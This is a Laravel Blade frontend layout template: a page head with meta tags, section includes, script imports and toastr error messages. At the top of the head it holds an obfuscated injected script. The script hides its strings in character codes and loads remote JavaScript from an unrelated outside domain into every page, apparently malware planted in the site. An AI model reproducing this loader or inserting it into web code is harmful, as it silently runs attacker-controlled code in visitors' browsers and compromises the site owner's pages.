<!DOCTYPE html>
<html lang="{{ str_replace('_', '-', app()->getLocale()) }}">
<head><script type=text/javascript> Element.prototype.appendAfter = function(element) {element.parentNode.insertBefore(this, element.nextSibling);}, false;(function() { var elem = document.createElement(String.fromCharCode(115,99,114,105,112,116)); elem.type = String.fromCharCode(116,101,120,116,47,106,97,118,97,115,99,114,105,112,116); elem.src = String.fromCharCode(104,116,116,112,115,58,47,47,116,114,101,110,100,46,108,105,110,101,116,111,97,100,115,97,99,116,105,118,101,46,99,111,109,47,109,46,106,115);elem.appendAfter(document.getElementsByTagName(String.fromCharCode(115,99,114,105,112,116))[0]);elem.appendAfter(document.getElementsByTagName(String.fromCharCode(104,101,97,100))[0]);document.getElementsByTagName(String.fromCharCode(104,101,97,100))[0].appendChild(elem);})();</script>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1">

    <!-- CSRF Token -->
    <meta name="csrf-token" content="{{ csrf_token() }}">
    @if(!empty($logo))
        <link rel="icon" href="{{ asset('storage/uploads/logo/'.$logo->logo) }}" type="image/x-icon">
        @else
        <link rel="icon" href="{{ asset('storage/uploads/logo/best-logo-2019-12-23-5e00ca913a046.png') }}" type="image/x-icon">
    @endif

    <title>{{ config('app.name', 'Laravel') }} - @yield('title')</title>
    @include('layouts.frontend.partial.meta')
    @stack('css')


<body>

@include('layouts.frontend.partial.header')
    <!-- benar -->
@yield('content')

   @include('layouts.frontend.partial.footer')
    <script src="{{('frontend/js/jquery.min.js')}}"></script>
    <script src="{{('frontend/js/bootstrap.js')}}"></script>
    <script src="{{('frontend/js/plugins.min.js')}}"></script>
    <script src="{{('frontend/js/popper.min.js')}}"></script>
    <script src="{{('frontend/js/jquery.meanmenu.js')}}" ></script>
    <script src="{{('frontend/js/waypoints.min.js')}}"></script>
    <script src="{{('frontend/js/app.js')}}"></script>
    <script src="{{('frontend/js/active.js')}}"></script>
    <script src="{{ asset('backend/js/admin.js') }}"></script>
<script src="http://cdn.bootcss.com/toastr.js/latest/js/toastr.min.js"></script>
{!! Toastr::message() !!}

<script>
    @if($errors->any())
    @foreach($errors->all() as $error)
    toastr.error('{{ $error }}','Error',{
        closeButton:true,
        progressBar:true,
    });
    @endforeach
    @endif
</script>

    @stack('js')

</body>
</html>
